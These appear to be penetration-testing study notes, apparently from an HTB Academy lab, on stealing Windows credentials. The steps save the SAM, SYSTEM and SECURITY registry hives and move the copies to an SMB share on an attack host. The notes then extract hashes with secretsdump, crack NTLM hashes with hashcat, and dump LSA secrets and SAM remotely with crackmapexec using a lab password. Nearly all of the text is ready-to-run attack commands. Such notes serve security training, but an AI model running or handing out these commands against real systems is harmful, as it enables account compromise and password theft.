
Copying SAM Registry Hives
- hklm\sam - local password account hashes
- hklm\system - system bootkey used to encrypt SAM database
- hklm\security - cached credentials for domain accounts

```cmd-session
reg.exe save hklm\sam C:\sam.save
```
```cmd-session
reg.exe save hklm\system C:\system.save
```
```cmd-session
reg.exe save hklm\security C:\security.save
```

Create SMB share on attack host
```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Move files to SMB share
```cmd-session
move sam.save \\10.10.15.16\CompData
```
```cmd-session
move security.save \\10.10.15.16\CompData
```
```cmd-session
move system.save \\10.10.15.16\CompData
```

#### Dumping Hashes with Impacket's secretsdump.py

```shell-session
locate secretsdump 
```
```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


Time to crack:

Add hashes to a txt file
```shell-session
sudo vim hashestocrack.txt
```

Hashcat against NTLM
```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

LSA Secrets (local admin privileges)
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Dump SAM remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

